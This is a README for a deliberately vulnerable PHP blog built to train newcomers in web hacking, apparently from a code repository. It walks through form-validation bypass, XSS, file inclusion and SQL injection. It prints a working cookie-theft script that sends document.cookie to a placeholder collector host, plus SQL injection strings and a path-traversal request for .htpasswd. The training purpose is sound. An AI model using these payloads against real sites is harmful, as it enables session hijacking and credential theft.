# Fake blog to hack for newbie training

## Overview

This is a fake blog that has many kinds of web vulnerabilities. This is usefull because it can be use to teach to newbies that web vulnerabilities exist and can be very damaging.

## Warning

It can be installed on a typical LAMP installation. You MUST NOT installed it on a production server or any server or network that should not be compromised. REMEMBER that the vulnerabilities on this application are REAL VULNERABILITIES. I am NOT RESPONSIBLE for what you do with it. 

## How to install it

The `blog_hack/` directory or the content of it have to be downloaded to your Apache `www` directory. Often, it is located to `/var/www/` on GNU/Linux system. 

You should edit the `blog_hack/init.php` file with your MySQL information. The default password of the admin user is `salut123`.

The `blog_hack/admin` directory has an `.htpasswd` file. The `admin` user password is `admin`. If you want to modify it, you must encrypt it if you are on GNU/Linux because Apache force to do so.

## How to use it

Here is a list of all vulnerabilities on this blog. If you don't want to know them because you want to discover them by yourself, you should stop reading this right now and begin to play with the application. Remember, you're not supposed to know the default credentials mentionned above.

### Form validation vulnerability

First of all, there is a form validation vulnerability in the subscription form. What you have to do is to submit the first form with "Level 1" account and then you arrive on a second page which is a hidden form. If you check the source, you'll see that there is a `type` field and a `total` field. So if you check in the first form for the values, you'll see that the value for the level 2 is 2. But here's the trick, you have to modify the `type` field in the second form with a value of 3 instead of 1 or 2 and you must not modify the `total` field because, in the validation, only the `total` field is validated but not the `type` field but what's inserted in the DB is the `type` field. Then, you submit the hidden form. You normally should be able to comment on blog article.

### XSS vulnerability

A XSS (means Cross-site scripting) vulnerability is a vulnerability that permits the user to inject some Javascript in a web page. Mainly, if you discover a XSS in a web site, you're able to steal user cookies, use them to connect to the web site as them and having access of all information that the user has access.

#### Non-persistent XSS

In the blog members list, you can search for members on the web site. If you enter quotes in the search field, you can end the html input tag and begin a script tag.

In the root directory of this repo, there is a `cookies.php` file and a `cookies.html` file. You have to download these 2 files to the web server of your choice. You can choose the same web server that you put the `blog_hack` site. Basically, what the `cookies.php` file does is to take a GET request with a parameter named `c` and writes it to the `cookies.html` file. You have to be sure that the `cookies.php` script has rights to write to the `cookies.html` file. I don't know the exact right that these files need to have so you can do a `chmod 777 cookies.php cookies.html` to be sure. You also can do that via FTP if you want.

So, all is in place. Let's the hacking begin! The goal of the manipulations here is to create an URL to send to a user that will redirect him to the `cookies.php` file with his cookie in the `c` parameter. Here is what you have to enter in the search field: `"> <script>document.location = "http://yourdomain/your/path/cookies.php?c=" %2b document.cookie;</script>`. The `%2b` is simply url encoded version of the `+` character; if we don't url encode it, it will be replaced by a space by your web browser if you enter it in the URL bar instead of the search field. If you enter it in your browser, you'll send your own cookies to you. Normally, the goal is to send an URL that contains this search to a user but this is not covered in this demonstration.

#### Persistent XSS

A persistent XSS is exactly the same as a non-persistent XSS except that the persistent XSS is inserted in a DB and all user that arrive on a certain page will be victim of the XSS. So, there is a persitent XSS in the comment section of each blog entry. The exploit technique is absolutly the same except you don't have to send a URL to a user and just wait that someone came to the page.

### File inclusion vulnerability

File inclusion vulnerabilities are vulnerabilities that can able an attacker to include a file not supposed to be include in the page. A classic example of this vulnerablity is a web site that take a parameter `page` in the URL to show the good page to the client. The URL usually looks like `http://mywebsite.com/index.php?page=home.php`. So, if the developper didn't secure his function, it is possible to include many files often on the server itself. More rarely, you could be able to include an external file and then execute the content of this file by PHP so doing what you want on the server.

So, what do we have here? There is a `page` parameter. If you try to write anyting else in this parameter, you'll see that the `.php` is added at the end of the include function. It's not very convenient. Also, you can notice that you're not able to include external files because the include file begin with `./include/`. But, if we look for vulnerabilities in the include function of PHP, we'll find that `include` had a vulnerability, in old version of PHP, that permitted to skip the end of the include string by inserting a NULL byte in the string because PHP stopped reading the string if it read a NULL byte. 

So now, we know we can possibly\* include any files on the web server if the user that executes PHP has the right to read these. Of course, if the system administrators are very dump, we could read the `/etc/shadow` and `/etc/passwd` files. But let's suppose they're not for the case here. If you do some tests on the website, you may have discovered there is a `admin/` URL with a username and a password. So, to discover what are the credentials, we use the file inclusion vulnerability we discovered and we do an URL like this: `index.php?page=../admin/.htpasswd`. And boom, we now have a hashed version of the admin user password. You can now use any tool that crack hashes and will discover that the password is `admin`.

To explain the URL, the first two dots (`../`) are there because if you remember the include string was begining with `./include/` so we need to come back because we want to go in the `./admin/` directory and not the `./include/admin/` directory. Finally, the `.htpasswd` file is the standard file for Apache HTTP password configuration (Htaccess).

\* In this case, this vulnerability is simulated. This is the only simulated vulnerability because this vulnerability has already existed but is not anymore available.

### SQL injection

The goal of this vulnerability is to inject SQL statement into SQL queries that are not intended to. To be able to exploit SQL injection, you have to know some basis of SQL. A classic SQL injection is when you have a login form that don't escape character in the username. Let's think how the SQL query might be build to verify if the user and the password match: `"SELECT * FROM users WHERE login = '".$_POST['login']."' AND password='".md5($_POST['password'])."'"`(in PHP). So, to bypass this verification, you can see that the login field is not verified against injection so you can inject any SQL fragment you want. Then, one injection that could bypass this verification could be `admin' #`. The single quote after the username is because we have to close the SQL string opened in the query. Finally, we have a hashtag character because we don't want that SQL verifies the password we entered so the hashtag is just a comment for the rest of the line.

#### Classical SQL injection in the fake blog

In the blog, there is two SQL injection. The first one is a more classical injection. If you go in the members list page and click on one member, you'll have an URL that looks like that: `index.php?page=profile&id=1`. So, if you play a little with the id parameter, you'll see that it can generate SQL error if you let a number at first character. The trick to exploit this SQL injection is to put a number that don't exist as an ID for a user in the database. With guessing, you'll arrive with that string: `-1 UNION SELECT id,login, password FROM user`. You could have found the name of the tables by guessing because they are very simple and usual or you could have found these by querying the MySQL catalog (see at the end of this text).

#### Blind SQL injection

The second one SQL injection in the blog is called a "Blind SQL injection". The qualifier "blind" simply means that you can't directly see what you want to see; you have to find a clue about what you have like a blind person do with a stick. More formally, a blind SQL injection is when you can have a boolean clue about what is executed in the SQL query. For instance, if you have a page saying that your answer is wrong and with a good SQL injection, the page says that your answer is good then you have a blind SQL injection.

In the blog, you maybe have notice there is a message in the bottom of each that says: "The browser you are currently using is not supported by our blog. This may cause some bugs. This message will disappear once you have a good browser.". In web hacking, it is important to know how HTTP works. With a message like that, normally, you'll think about HTTP user-agent and you're right. You can also guess if your browser provide a good HTTP user-agent, the message will disappear as said in the message. So, if you tried to inject some data like quote (') in the user-agent, you'll see SQL errors.

The goal here is to inject SQL fragment and see if the message disappears or not. Usually, you try to find how long the string in the database is first. Then, you try to brute-force each by each character of the string by a set of characters you choose. After that, you have all you need. For the first step, you can use the `LENGTH(mycolumn)` SQL function and compare it with a range of number until it return true. For the second step, you can use the `SUBSTRING(mycolumn, i, 1)` SQL function where `i` is the index of the character in the string to brute-force and also compare it with a set of characters you choose. You can see all that in the "Exploit\_Blog\_hack.php" file where the attack is made to find the password of the admin user.

## Others

### MySQL INFORMATION\_SCHEMA

The MySQL INFORMATION\_SCHEMA schema is a schema containing all information about your schemas and your tables. It can be particuliary useful when doing SQL injection and having no idea what are the tables name or their columns name. The most useful tables in that schema are `TABLES` and `COLUMNS`. Here is an example of query to obtain a list of columns associated to their tables in the `blog_hack` schema.

```sql
    SELECT 
	    information_schema.tables.table_schema, 
        information_schema.tables.table_name,
		information_schema.columns.column_name
    FROM 
	    information_schema.tables
            JOIN information_schema.columns ON 
			    information_schema.columns.table_name = information_schema.tables.table_name AND 
				information_schema.columns.table_schema = information_schema.tables.table_schema
    WHERE 
	    information_schema.tables.table_schema = 'blog_hack';
```

And, this is a link to the INFORMATION\_SCHEMA schema documentation: https://dev.mysql.com/doc/refman/5.7/en/information-schema.html

### Useful tools in web haking

### Instinct

### Useful links
